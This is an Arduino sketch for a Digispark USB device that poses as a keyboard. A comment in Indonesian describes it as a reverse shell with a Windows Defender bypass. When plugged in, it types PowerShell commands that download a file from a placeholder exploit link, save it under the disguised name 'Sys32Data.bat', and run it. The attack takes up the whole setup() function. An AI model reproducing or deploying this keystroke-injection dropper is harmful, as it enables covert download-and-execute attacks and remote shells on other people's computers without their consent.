#include "DigiKeyboard.h"

void setup() {
  // Membuat program reverse shell dengan bypass Windows defender
  int d = 3000;
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT); //minimize semua program yang berjalan
  DigiKeyboard.delay(d);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("$client.DownloadFile('{link exploit}','Sys32Data.bat')");
  DigiKeyboard.delay(d);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("./Sys32Data.bat");
  DigiKeyboard.delay(d);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  //DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  //DigiKeyboard.println("Hello Digispark!");
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  //DigiKeyboard.delay(5000);
}
